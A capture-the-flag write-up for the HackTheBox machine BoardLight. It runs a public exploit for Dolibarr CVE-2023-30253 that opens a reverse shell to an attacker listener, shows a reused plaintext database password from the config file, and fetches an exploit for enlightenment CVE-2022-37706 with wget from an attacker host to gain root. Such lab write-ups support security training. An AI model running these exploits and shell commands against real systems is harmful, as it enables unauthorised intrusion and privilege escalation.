---
title: "HackTheBox - BoardLight"
published: true
---

| Field            | Details                                                                                                                   |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                     |
| **Difficulty**   | Easy                                                                                                                      |
| **Release Date** | 2024-05-25                                                                                                                |
| **Pwned Date**   | 2026-05-31                                                                                                                |
| **Tags**         | `php` `ffuf` `subdirectory enumeration` `dolibarr` `CVE-2023-30253` `enlightenment privilege escalation` `CVE-2022-37706` |

## Summary

BoardLight is an easy difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data. After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell.

## Reconnaissance

Run a scan of the target

```bash
python portscan.py --target <TARGET_IP>
```

This is a custom tool you can find at https://github.com/n-califano/sectools. Otherwise you can just chain these two nmap commands to have the same result

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 22,80 -oN service_scan.txt <TARGET_IP>
```

In any case the result will show two ports open

```
[snip]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[snip]
```

Browsing to the site on port 80 you discover a website for a mock cybersecurity consulting firm.

The main page contains several references to a 'board.htb' domain.

Add the following line to the /etc/hosts file

```
<TARGET_IP>   board.htb
```

Try to browse to http://board.htb, it should show the same website shown by browsing to the raw ip.

Move to web enumeration

```bash
python webenum.py  --web --api --vhost board.htb -t http://board.htb
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/webenum.py) that performs both subdomain and subdirectory enumeration. Otherwise, if you want to use standard tools, you can run

```bash
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,201,204,301,302,307,401,403,405,500 -fs 15949 -o <OUTFILE> -of csv -s
```

Regardless of the command you will get this subdomain in the output

```bash
crm,http://board.htb,,72,200,6360,397,150,text/html; charset=UTF-8,96.584682ms,,271e348
```

The scan found a new subdomain: crm.board.htb.

Change the line added earlied in the /etc/hosts file to

```
<TARGET_IP>   board.htb crm.board.htb
```

Now the subdomain is accessible via browser and it hosts a Dolibarr 17.0.0 login page, a CRM software.

It's possible to login with default credentials: admin / admin

This version of the service is vulnerable to [CVE-2023-30253](https://www.tinextacyber.com/security-advisory-dolibarr-17-0-0-php-code-injection-cve-2023-30253/)

The tool allows to create websites and the validation that should block unauthorized users from writing php code is faulty. It does block php code in standard php tags ("<?php code..?>") but changing a bit the tag (example: <?PHP code…?>) it's possible to avoid detection and still write valid php code.

This can be abused to create a php page that spawn a reverse php shell on the target

There is an existing PoC exploit on GitHub: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

## Foothold

Clone the script

```bash
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
```

Listen for incoming shell connection

```bash
nc -lvnp 9001
```

Run the exploit

```bash
python3 exploit.py http://crm.board.htb admin admin <ATTACKER_IP> 9001
```

```
[] Trying authentication...
[] Login: admin
[] Password: admin
[] Trying created site...
[] Trying created page...
[] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

You will get a reverse shell on port 9001

```
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.231.37] 53022
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```

and get access as the www-data user

## Privilege Escalation

You landed in the dolibarr installation directory, look at the dolibarr config

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
```

```
[snip]
$dolibarr_main_db_pass='serverfun2$2023!!';
[snip]
```

The config file contains the credentials for the db.

Instead of looking directly in the db, check if this password was reused for other accounts

```bash
cat /etc/passwd
```

```
[snip]
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
[snip]
```

The box presents a 'larissa' user. Try to access it with the password found earlier

```bash
ssh larissa@<TARGET_IP>
```

```
[snip]
larissa@boardlight:~$
```

You should be able to get access to the user 'larissa'.

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
[snip]
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
[snip]
```

The system has several SUID binaries from the enlightenment window manager.

Check the version

```bash
dpkg -l enlightenment
```

```
[snip]
hi enlightenment **0.23.1-4** amd64 X11 window manager based on EFL
```

This version is vulnerable to [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md)

It’s a command injection vulnerability in the 'enlightenment_sys' binary that uses SUID privileges to spawn a root shell

Get the exploit on your attacking machine

```bash
git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git
```

Serve the exploit to the target with the python webserver

```bash
python -m http.server
```

Fetch the exploit on the target and make it executable

```bash
wget http://<ATTACKER_IP>:8000/exploit.sh
chmod +x exploit.sh
```

Run the exploit

```bash
./exploit.sh
```

```
CVE-2022-37706
[] Trying to find the vulnerable SUID file...
[] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
#
```

```bash
# whoami
root
```

Got root access.
